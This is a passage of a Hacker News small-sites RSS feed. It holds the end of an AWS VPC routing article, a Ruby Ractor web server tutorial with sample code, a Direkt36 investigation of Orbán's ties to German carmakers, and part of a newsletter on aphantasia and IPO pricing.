table private. For our public subnet we need to make a new table, and add routes to Internet Gateway there:</p><table><thead><tr><th>Destination</th><th>Target</th></tr></thead><tbody><tr><td><code>10.0.0.0/20</code></td><td>local</td></tr><tr><td><code>2001:db8::aa01/64</code></td><td>local</td></tr><tr><td><code>0.0.0.0/0</code></td><td>internet gateway</td></tr><tr><td><code>::/0</code></td><td>internet gateway</td></tr></tbody></table><p>Now we just associate our public subnet with the new route table to make them <em>really</em> public.</p><h3 id="network-access-control-lists-nacls">Network Access Control Lists (nACL’s)</h3><p><em>nACL’s</em> are an additional level of protection that sits in front of your subnets. You can configure them by adding firewall rules operating on <a href="https://en.wikipedia.org/wiki/OSI_model#Layer_4:_Transport_Layer">OSI layer 4</a>. Default NACL configuration allows all traffic through, and it suits our usecase. If you need to block a particular source IP or destination port …</p></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://scorpil.com/post/aws-vpc/">https://scorpil.com/post/aws-vpc/</a></em></p>]]>
            </description>
            <link>https://scorpil.com/post/aws-vpc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533200</guid>
            <pubDate>Sun, 20 Sep 2020 10:47:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Ractor-based web server]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533152">thread link</a>) | @todsacerdoti
<br/>
September 20, 2020 | http://kirshatrov.com/2020/09/08/ruby-ractor-web-server/ | <a href="https://web.archive.org/web/*/http://kirshatrov.com/2020/09/08/ruby-ractor-web-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><span>08 Sep 2020</span></p><p>Ractor, the new concurrency primitive in Ruby, <a href="https://github.com/ruby/ruby/pull/3365" target="_blank">has been merged</a> to the upstream few days ago. I’ve been following that PR and watching the author’s <a href="https://www.youtube.com/watch?v=40t8EPpnujg&amp;list=PLbFmgWm555yZeLpdOLhYwORIF9UjBAFHw&amp;index=17" target="_blank">talk at RubyKaigi</a> (in Japanese, I wasn’t able to find the translated version but it should be available <em>somewhere</em>), which got me excited to try Ractor myself.</p>

<p>A web application server is the first thing that comes to mind when playing with concurrency. On top of that, not too long ago I’ve implemented TCP servers in Rust and Go, so I got curious to write a <strong>simple web server using Ractor</strong>.</p>

<p>Let’s dive in!</p>

<h2 id="whats-in-a-web-server">What’s in a web server?</h2>

<p>A web server is something that accepts a TCP socket, reads from it, parses HTTP headers and responds with HTTP body. It’s a text-based protocol that is easy to implement.</p>

<p>Here’s a sample request (what you’d read from the socket):</p>

<div><div><pre><code>GET / HTTP/1.1
Host: localhost:10000
User-Agent: curl/7.64.1
Accept: */*
</code></pre></div></div>

<p>And a sample response (what you’d write):</p>

<div><div><pre><code>HTTP/1.1 200
Content-Type: text/html

Hello world
</code></pre></div></div>

<p>We will start by grabbing a gist from the <a href="https://blog.appsignal.com/2016/11/23/ruby-magic-building-a-30-line-http-server-in-ruby.html" target="_blank">Building a 30 line HTTP server in Ruby</a> post by AppSignal.</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>
<span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>

<span>while</span> <span>session</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
  <span>request</span> <span>=</span> <span>session</span><span>.</span><span>gets</span>
  <span>puts</span> <span>request</span>

  <span>session</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
  <span>session</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
  <span>session</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
  <span>session</span><span>.</span><span>print</span> <span>"Hello world! The time is </span><span>#{</span><span>Time</span><span>.</span><span>now</span><span>}</span><span>"</span>

  <span>session</span><span>.</span><span>close</span>
<span>end</span>
</code></pre></div></div>

<h2 id="starting-with-ractor">Starting with Ractor</h2>

<p>To get started with Ractor, I recommend to read the <a href="https://github.com/ko1/ruby/blob/dc7f421bbb129a7288fade62afe581279f4d06cd/doc/ractor.md" target="_blank">doc</a> in the ruby repo.</p>

<p>Now, let’s wrap the example from above into Ractors.</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>
<span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>
<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span> <span>do</span>
    <span>loop</span> <span>do</span>
      <span># receive TCPSocket</span>
      <span>s</span> <span>=</span> <span>Ractor</span><span>.</span><span>recv</span>

      <span>request</span> <span>=</span> <span>s</span><span>.</span><span>gets</span>
      <span>puts</span> <span>request</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world! The time is </span><span>#{</span><span>Time</span><span>.</span><span>now</span><span>}</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>loop</span> <span>do</span>
  <span>conn</span><span>,</span> <span>_</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
  <span># pass TCPSocket to one of the workers</span>
  <span>workers</span><span>.</span><span>sample</span><span>.</span><span>send</span><span>(</span><span>conn</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>We start the number of workers that equals the number of CPUs and have the main thread to listen to connections on the socket and send accepted connection to a random Ractor. We can validate that it works as expect by making a request with <code>curl</code>.</p>

<p>However, distributing requests among workers using <code>workers.sample</code> is not very efficient. That random worker might still be busy serving the previous request. We’d rather have workers pull from a shared queue where we’d send all requests.</p>

<p>I wanted to make that part better but I didn’t find any Ractor-friendly queue implementation. However, the <a href="https://github.com/ko1/ruby/blob/dc7f421bbb129a7288fade62afe581279f4d06cd/doc/ractor.md" target="_blank">doc</a> suggesting using a pipe like a queue. Let’s try that!</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>

<span># pipe aka a queue</span>
<span>pipe</span> <span>=</span> <span>Ractor</span><span>.</span><span>new</span> <span>do</span>
  <span>loop</span> <span>do</span>
    <span>Ractor</span><span>.</span><span>yield</span><span>(</span><span>Ractor</span><span>.</span><span>recv</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>s</span> <span>=</span> <span>pipe</span><span>.</span><span>take</span>

      <span>data</span> <span>=</span> <span>s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span>
      <span>puts</span> <span>data</span><span>.</span><span>inspect</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world!</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>
<span>loop</span> <span>do</span>
  <span>conn</span><span>,</span> <span>_</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
  <span>pipe</span><span>.</span><span>send</span><span>(</span><span>conn</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>It worked! By using the pipe I was able to make all workers to pull for sockets which improved the load balancing part.</p>

<p>What’s still not great is that there’s nothing that monitors workers in case one of them unexpectedly dies. And similar to <a href="https://github.com/puma/puma/blob/master/docs/architecture.md" target="_blank">Puma’s architecture</a>, it would be more efficient to have a separate thread to wait for sockets to become ready to read before passing them to actual workers.</p>

<p>I was able to move listener into its own Ractor and to make the main thread to watch all Ractors:</p>

<div><div><pre><code><span>require</span> <span>'socket'</span>

<span>pipe</span> <span>=</span> <span>Ractor</span><span>.</span><span>new</span> <span>do</span>
  <span>loop</span> <span>do</span>
    <span>Ractor</span><span>.</span><span>yield</span><span>(</span><span>Ractor</span><span>.</span><span>recv</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>s</span> <span>=</span> <span>pipe</span><span>.</span><span>take</span>
      <span>puts</span> <span>"taken from pipe by </span><span>#{</span><span>Ractor</span><span>.</span><span>current</span><span>}</span><span>"</span>

      <span>data</span> <span>=</span> <span>s</span><span>.</span><span>recv</span><span>(</span><span>1024</span><span>)</span>
      <span>puts</span> <span>data</span><span>.</span><span>inspect</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world!</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>listener</span> <span>=</span> <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
  <span>server</span> <span>=</span> <span>TCPServer</span><span>.</span><span>new</span><span>(</span><span>8080</span><span>)</span>
  <span>loop</span> <span>do</span>
    <span>conn</span><span>,</span> <span>_</span> <span>=</span> <span>server</span><span>.</span><span>accept</span>
    <span>pipe</span><span>.</span><span>send</span><span>(</span><span>conn</span><span>,</span> <span>move: </span><span>true</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>loop</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>select</span><span>(</span><span>listener</span><span>,</span> <span>*</span><span>workers</span><span>)</span>
  <span># if the line above returned, one of the workers or the listener has crashed</span>
<span>end</span>
</code></pre></div></div>

<p>Again, it worked!</p>

<p>The next step of implementing a web server would be to bake a HTTP parser to read request headers. There’s a <a href="https://github.com/cotag/http-parser" target="_blank">http-parser</a> gem that is using a C extension, and I’ve heard that is not supported by Ractor yet.</p>

<p>I found an HTTP parser that comes as a part of WEBrick which is a built into Ruby’s standard library.</p>

<p>I tried the following snippet:</p>

<div><div><pre><code><span>require</span> <span>'webrick'</span>

<span>CPU_COUNT</span> <span>=</span> <span>4</span>
<span>workers</span> <span>=</span> <span>CPU_COUNT</span><span>.</span><span>times</span><span>.</span><span>map</span> <span>do</span>
  <span>Ractor</span><span>.</span><span>new</span><span>(</span><span>pipe</span><span>)</span> <span>do</span> <span>|</span><span>pipe</span><span>|</span>
    <span>loop</span> <span>do</span>
      <span>s</span> <span>=</span> <span>pipe</span><span>.</span><span>take</span>

      <span># raises "can not access non-sharable objects in constant HTTP by non-main Ractors (NameError)"</span>
      <span>req</span> <span>=</span> <span>WEBrick</span><span>::</span><span>HTTPRequest</span><span>.</span><span>new</span><span>(</span><span>WEBrick</span><span>::</span><span>Config</span><span>::</span><span>HTTP</span><span>)</span>
      <span>req</span><span>.</span><span>parse</span><span>(</span><span>s</span><span>)</span>

      <span>s</span><span>.</span><span>print</span> <span>"HTTP/1.1 200</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Content-Type: text/html</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"</span><span>\r\n</span><span>"</span>
      <span>s</span><span>.</span><span>print</span> <span>"Hello world!</span><span>\n</span><span>"</span>
      <span>s</span><span>.</span><span>close</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p><code>WEBrick::Config::HTTP</code> turned to be a mutable hash with some configuration objects. Since that constant and a hash were initialized in the main thread, it wasn’t allowed to be safely used from ractors. I worked around by inlining the hash definition but then I hit another non-shareable constant referenced from the WEBrick code that wasn’t too easy to inline.</p>

<p>This is probably the part that will improve on the upstream very soon. After all, this is the earliest Ractor implementation.</p>

<h2 id="the-end">The end</h2>

<p>I’m really excited about new concurrency primitives like Ractor getting pushed into Ruby’s upstream.</p>

<p>The Ractor model seems powerful and ready for experimental use. Within the next 6 months (Ruby 3.0 release is scheduled for December), I foresee a Ractor-based web server to come out to leverage this feature and get the most out of server CPUs. This is a great opportunity to learn concurrent programming and to contribute to the Ruby community.</p>

<p>For those curious to try Ractor, I’d suggest to try implementing other things that benefit from parallel execution, for instance a background job processor.</p>

<p>To try Ractor, you’ll need to build Ruby from the upstream. Read my previous posts (<a href="https://kirshatrov.com/2020/01/11/contributing-to-mri/" target="_blank">Contributing to Ruby MRI</a>) to learn about how to do that.</p>

</div></div>]]>
            </description>
            <link>http://kirshatrov.com/2020/09/08/ruby-ractor-web-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533152</guid>
            <pubDate>Sun, 20 Sep 2020 10:35:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Orbán played Germany, Europe's great power]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532961">thread link</a>) | @vr46
<br/>
September 20, 2020 | https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/ | <a href="https://web.archive.org/web/*/https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>In October 2017, important figures of German and international business and political life gathered at a reception in a glass-walled hall on one of the upper floors of Frankfurt’s tallest skyscraper. At the event, one of the top executives of a German automobile manufacturing group, warmed and loosened up by some glasses of wine, started entertaining those around him with anecdotes. After some time, the conversation was directed to Hungary.</p>
<p>The senior automotive manager bragged about the fact that the executives of his company could call Hungarian Foreign Minister Péter Szijjártó at any time if they had any requests regarding their factories in Hungary. He then added that if necessary, they could even speak directly to Viktor Orbán – in fact, he said, the Hungarian Prime Minister had already helped them with a specific case.</p>
<p>Two years earlier, in September 2015, Germany’s automotive industry was hit by its biggest scandal ever. It was found that Volkswagen Group’s (VW) diesel cars used software manipulation to cheat on emission tests for many years (later several other German and non-German companies were found to have manipulated their data in a similar way). As a result of the scandal, the price of VW shares began to plummet and it looked like several companies could be seriously endangered, forcing them to close factories and cut jobs.</p>
<p>At the reception in Frankfurt, the German automotive executive claimed that the diesel emissions scandal had become so embarrassing for the federal government after a while that they felt the German state was starting to back out from behind them. Executives of his group of companies then turned directly to Viktor Orbán, asking him to represent the interests of car manufacturers in the European Council that was currently discussing the matter. Viktor Orbán agreed to help and kept his promise, the German automotive executive said with satisfaction.</p>
<div itemscope="" itemtype="http://schema.org/VideoObject"><p><iframe src="//www.youtube.com/embed/xCtaFfcysH4?iv_load_policy=3&amp;modestbranding=1&amp;rel=0&amp;wmode=transparent&amp;autoplay=0" frameborder="0" scrolling="no" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p></div>
<p>Since the beginning of 2016, the European Council, which represents governments of European Union member states, has repeatedly addressed the reform of vehicle emission rules. However, Germany has been trying to soften stricter regulations in alliance with Italy and Eastern European member states with significant German automotive investments. In September 2017, a new regulation finally came into force but it was full of loopholes, applied only to new cars not yet on the roads, and made many other concessions to automakers.</p>
<p>A German business source present at the Frankfurt reception told Direkt36 about the lobbying and the role of Orbán, adding that there was nothing glaring about it. “Representatives of every important company say they have Szijjártó and others’ phone numbers,” the source said, adding that top executives of several German carmakers told similar stories, and that they all</p>
<blockquote><p>“absolutely feel that the Hungarian government is in their pockets.”</p></blockquote>
<p>The spokesperson of Viktor Orbán and the Ministry of Foreign Affairs and Trade headed by Szijjártó did not respond to our request.</p>
<p>However, a former senior official in the Orbán government confirmed that “Viktor Orbán defends the interests of German car manufacturers in the European Council”. Nevertheless, according to the source, there is nothing surprising in this, as Hungarian governments have always been accommodating to German carmakers. Following the outbreak of the diesel emissions scandal, Mihály Varga, Minister of Finance of the Orbán government, said that 2-2.5 million of the Volkswagen Group’s 11 million diesel cars with cheating engines were manufactured at the Audi plant in the city of Győr and that “the government’s most important goal is maintaining jobs in the automotive industry and preserving the stability that the automotive industry provides in Hungary”.</p>
<p>The above story is a good example of how a relationship based on mutual benefits and dependence has developed between German policy makers, influential companies in German industry and the Hungarian government over the years and decades. German carmakers are the number one engine of Hungarian economic growth and, through this, of the Orbán government’s political successes. According to data by the Hungarian Central Statistical Office, car manufacturing accounts for 4.5% of Hungary’s GDP and suppliers working for large car manufacturers account for another 5-8%. This means that every eighth to tenth forint produced in Hungary has to do something with the Germany-dominated car industry.</p>
<p>Now is a particularly sensitive period in Hungarian-German relations. In the coming months, political issues determining the long-term European bargaining power of the Orbán government and Hungary will be settled in the European Union. In these debates, Viktor Orbán’s German allies will have the final say, and although they have repeatedly criticized decisions of the Hungarian government, they have so far refrained from acting really hard.</p>
<p>Direkt36 uncovered details of this intricate system of relationships, the interests that drive it, and the key players in a months-long investigation. We found how decades of personal relationships control Orbán’s maneuvers in Germany; how German companies give up much-talked-about democratic values ​​if it is in their business interests; and, for example, that the Hungarian government was able to prevent Jewish leaders in Budapest from sharing their concerns with Angela Merkel.</p>
<p>In our research, we had in-depth background conversations with two dozen sources — current and former government officials, diplomats, political intermediaries, business executives, and analysts. Most of them shared information about behind-the-scenes events if we did not write down their names.</p>
<h2>I. Orbán’s German patrons</h2>
<figure id="attachment_6438"><img src="https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001.jpeg" alt="" width="3868" height="2416" srcset="https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001.jpeg 3868w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-150x94.jpeg 150w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-300x187.jpeg 300w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-768x480.jpeg 768w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-1200x750.jpeg 1200w, https://www.direkt36.hu/wp-content/uploads/2020/09/signal-2020-09-17-093904_001-1177x735.jpeg 1177w" sizes="(max-width: 3868px) 100vw, 3868px"><figcaption>Source: kormany.hu</figcaption></figure>
<p>“Call the Count and tell him we’d like to visit him!” <span lang="EN">This is the task Viktor Orbán gave Gergely Prőhle on the night of his first election victory, on May 24, 1998. Prőhle was the head of the Budapest office of the Friedrich Naumann Foundation (ie the party foundation of the German Free Democratic Party, the FDP). </span> Four days later, the new prime minister-elect was already in Bonn, where executives of German industrial giants like Audi, Bosch or Siemens were waiting to meet him. Orbán reassured them, according to the Hungarian state news agency’s report, that a predictable economic environment awaits them, moreover, his government wants to increase foreign investment, primarily in manufacturing.</p>
<p>The meeting, which was organized in only matter of few days, was thanks to to Otto Graf Lambsdorff, the influential liberal politician and honorary president of the FDP, who was most often referred to by his acquaintances only as “the Count”. Lambsdorff had known Orban for a long time, he led the Liberal International when Fidesz became a member in 1992. During Orbán’s visit, Lambsdorff proudly talked to the German press about the future prime minister and boasted that he “has been watching Orbán’s political career since the regime change in Hungary and is very happy to support him”. Gergely Prőhle, who later also served as ambassador to Berlin and deputy secretary of state for foreign affairs under the Orbán government, told Direkt36 that “Lambsdorff had already started traveling to Eastern Europe before 1989 and had become Orbán’s first German patron. He was an infinitely smart person from whom much could be learned. The count saw the economic-political ties in light of a full historical context, he was a formidable personality”.</p>
<p><span lang="EN">The relationship between Orbán and Lambsdorff was so close that it even survived when Fidesz broke ties with the European political family the Count represented. Prőhle also wrote an article on Lambsdorff for <a href="https://www.valaszonline.hu/2019/12/05/ezt-a-libprohle-gergely-otto-graf-lambsdorff/">Valasz Online</a>. According to him, the Count watched Orbán’s politics turn conservative in the mid-1990s with some disappointment, but accepted the political realities. He also observed, how over time, leader of the Christian Democratic Union (CDU) Helmut Kohl became the most important point of reference for Orbán. At one point, Orbán explained to Lambsdorff that </span></p>
<blockquote><p><span lang="EN">“in order for him to maximize votes in Hungary, the liberal slogan is not good, and the Count understood that”. </span></p></blockquote>
<p><span lang="EN">However, the two politicians remained close friends, and later in 2009 Orbán was the only foreign guest at Lambsdorff’s private funeral.</span></p>
<p><span lang="EN">During his visit to Germany in May 1998, Orbán not only spoke to company executives, but also spent an hour and a half meeting with German Chancellor Helmut Kohl, then head of government for 16 years, who was facing a really close election a few months later. At that time, officials from the Hungarian foreign ministry, which was still under socialist leadership, advised Orbán to also meet Kohl’s challenger, Gerhard Schröder, because he seemed more likely to win the election. However, because of his loyalty to Kohl, “Orbán rejected this idea, while for example, the Polish Prime Minister did meet with Schröder. Schröder and his people didn’t forget this later, neither for the Poles, nor for us,” a former Hungarian foreign ministry official told Direkt36.</span></p>
<p><span lang="EN">It was a tight race, but Schröder eventually defeated Kohl. According to Sándor Peisch, who served as Hungarian ambassador to Berlin under the Socialist MSZP governments between 2003 and 2010, this was also the end of an era when the German leadership still looked at Hungary with gratitude for its role in the country’s reunification. An important milestone in the process leading to the fall of the Berlin Wall, was the opening of the Hungarian-Austrian border. It started in the summer of 1989 and was officially announced in September, paving the way for East German refugees to travel via Austria to West Germany. But “the SPD was never enthusiastic about reunification. At one of our meetings, for example, Chancellor Schröder began to complain about how much money it had costed,” Peisch told Direkt36.</span></p>
<p><span lang="EN">Viktor Orbán and Helmut Kohl thus ruled simultaneously for only a few months. While Lambsdorff was a true …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/">https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/</a></em></p>]]>
            </description>
            <link>https://www.direkt36.hu/en/a-magyar-nemet-kapcsolatok-rejtett-tortenete/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532961</guid>
            <pubDate>Sun, 20 Sep 2020 09:50:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Seeing things a different way; simple test for aphantasia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24532946">thread link</a>) | @avoidboringppl
<br/>
September 20, 2020 | https://www.leonlinsx.com/aphantasia/ | <a href="https://web.archive.org/web/*/https://www.leonlinsx.com/aphantasia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
            <p> 




  15 minute read
</p>
          
        </header>
      

      <section itemprop="text">
        
        <h2 id="takeaways">Takeaways</h2>

<ol>
  <li>The way you imagine things could be drastically different compared to most. There’s a simple test to find out how</li>
  <li>IPO pricing is difficult and success is hard to measure</li>
  <li>The direct relationship newsletters provide is game-changing, and I think the industry has huge room for growth</li>
</ol>

<p><em>This is a lightly edited version of <a href="https://avoidboringpeople.substack.com/" title="ABP">my monthly newsletter.</a> Sign up below</em></p>





<h2 id="how-well-can-you-visualise-something">How well can you visualise something?</h2>

<p>I just learnt that people visualise differently. Take this 10 second test:</p>

<p><img src="https://www.leonlinsx.com/assets/images/Aphantasia-test.png" alt="aphantasia"></p>

<p>I’m at a 3 to 4, whereas my cousin swears she’s at a 6 [1]. This goes a long way towards explaining my confusion whenever people were telling me to visualise things… I never could get the detail and clarity that everyone else seemed to be experiencing.</p>

<p><strong>For those people that score a 1, you likely have <a href="https://www.bbc.com/news/health-34039054" title="BBC">aphantasia</a>, a condition in which you’re unable to visualise mental images.</strong> <a href="https://www.reddit.com/r/slatestarcodex/comments/ab1fi4/is_aphantasia_real_exaggerated_or_a/" title="reddit">There’s skepticism over whether it’s real,</a> but the research seems convincing. The <a href="https://www.researchgate.net/publication/26792259_Loss_of_imagery_phenomenology_with_intact_visuo-spatial_task_performance_A_case_of_'blind_imagination'" title="older">initial paper</a> studied a person who initially had high visual memory and then lost it. Since he was able to talk about the distinct difference between his two states, I’m inclined to think this is a real phenomenon.</p>

<p>The research estimates 2% of the population having aphantasia, a small amount on the other extreme (hyperphantasia), and most people are in the middle with good visualisation ability.</p>

<p><a href="https://www.eugencpopa.ro/wp-content/uploads/Afantazia-.pdf" title="newer">The newer paper</a> has a questionnaire, more scientific than my simple test above, that you might want to check out for confirmation. I’m inferring that a score of ~30 or lower indicates aphantasia, and a higher score close to 80 indicates hyperphantasia [2].</p>

<p>Was an interesting day when I realised the way I think is completely different from how most people think! The strange thing is I could have gone my entire life without knowing, since it’s not something you’d discover on your own. Combined with the low occurrence rate, no wonder it’s taken so long for the scientific community to realise the existence of aphantasia.</p>

<p>What’s even stranger is that despite this literally life-changing knowledge, I don’t see how anything changes for me. <a href="https://www.scientificamerican.com/article/when-the-minds-eye-is-blind1/" title="learning">It doesn’t seem like you can learn to get better</a>, implying we’re all stuck at whatever we grew up with (or were born into?).</p>

<p>It also doesn’t seem like there have been many negative side effects thus far [3]. Knowing about this <em>has</em> made me less confused whenever I read or hear people talking about using my imagination though! Do let me know how you end up scoring!</p>

<h2 id="what-goes-on-behind-the-scenes-of-an-ipo">What goes on behind the scenes of an IPO?</h2>

<p>People hear about IPOs frequently, but usually are less aware of what happens behind the scenes. a16z recently <a href="https://a16z.com/2019/07/09/ipo-process-prices-behind-scenes-companies/" title="a16z">wrote a post</a> about the process, and I’m following up with some of my experience. As a reminder, none of this is investment advice. Ever.</p>

<blockquote>
  <p>[The S1] also serves as a marketing document positioning the company and its role in the marketplace, because the company has to avoid public promotion during the waiting period and follow strict rules around what they can and can’t say on behalf of the company. But behind closed doors during this time, the company does pre-pitch the company story and financials to potential investors.</p>
</blockquote>

<p>The “dumb” retail investor buys into an IPO because they’ve heard the stock will do well. The “smart” retail investor does diligence on the S1, comes up with their own financial model, and then decides whether they should participate.</p>

<p>Most retail investors assume there’s a level playing field, since the S1 should show all the important publicly available information and there shouldn’t be anything they’re missing out. <strong>This has never been true.</strong> Professional investors meet with management <em>all the time</em>, even pre-IPO. They don’t get material non-public information from these meetings, but I can assure you that nobody would waste their time doing management meetings if they weren’t helpful in some way.</p>

<blockquote>
  <p>With the order book in hand, the underwriters (banks) will allocate the shares to institutional investors. As part of this, they — and the company — want to minimize IPO allocations to investors that have a track record of selling the stock too quickly. They don’t always succeed in doing this, but that’s OK, since some selling helps make a “market”.</p>
</blockquote>

<p>There’s a capital markets team in the investment bank that works together with the company to decide how much stock to initially give out to the interested investors. Investors could ask for 10 shares at a $40 IPO price, but just 5 shares if the IPO price goes up to $45. Investors frequently ask for more shares than they think they’ll get, leading to an offering being “oversubscribed”. <strong>Nearly all offerings are oversubscribed,</strong> so if you read the news reporting that, just ignore it.</p>

<p>The intent during this bookbuilding process is to determine what price the company should IPO at, how much “real” demand there is, and who to give it to. I think regular IPOs usually allocate ~80% to institutional clients and ~20% other (<strong>Winnie</strong>, correct me if I’m mistaken here). Importantly, you and I don’t get to buy at the IPO price, but only at the price the stock starts trading at, which is usually higher.</p>

<blockquote>
  <p>People often assume an IPO means the entire company is going public — just because those companies are required to open their books and report their earnings on a quarterly basis — but actually no more than 10%-15% of the company is typically being sold. Such limited supply can have outsize impact in a short time frame, especially if there’s great demand.</p>
</blockquote>

<p>No company I know of has given 100% of the company away during an IPO. I suppose it’s possible, but that would be strange and probably a red flag [4]. The price is <a href="https://clutejournals.com/index.php/JBER/article/view/2412" title="IPO pop">usually set to have a first day “pop”</a> as a form of reward to the shareholders that supported the company and to also generate positive publicity and good vibes for the company employees.</p>

<p><a href="https://markets.businessinsider.com/news/stocks/slacks-direct-listing-bill-gurley-says-startups-call-morgan-stanley-2019-6-1028298641" title="Bill">Critics of the IPO process</a> think that this “pop” leaves money on the table, which is true, but <strong>most employees would (irrationally) prefer to have the stock IPO and keep going up</strong> rather than the reverse.</p>

<blockquote>
  <p>So how to gauge the success of IPO after the “pop”? Beyond Meat is trading today above $100. Does that mean the company left money on the table? If you do the math, the company raised about $240 million from the IPO. Had the stock been priced at the first-trade price ($46), however, it could have raised nearly double that amount — and well more if it had priced at the closing stock price. Then again, people might not have invested as much at that price.</p>
</blockquote>

<p>To further explain the <a href="http://www.underpricing.de/Downloads/Louhgran_Why%20Dont%20Issuers.pdf" title="research">“money on the table” issue</a>, BYND priced at $25, meaning institutional investors (not you and I) bought it at $25. When it started trading, someone (could be you or I now) put in an order at $46, and a holder of the share was willing to sell at $46, hence filling that order.</p>

<p>Some people would argue that if there was demand at $46, perhaps BYND should just have priced at $46 instead and gotten more cash from investors. Bill Gurley would argue to use a direct listing instead to match all demand and supply.</p>

<p><img src="https://www.leonlinsx.com/assets/images/Tilray-IPO.png" alt="Tilray"></p>

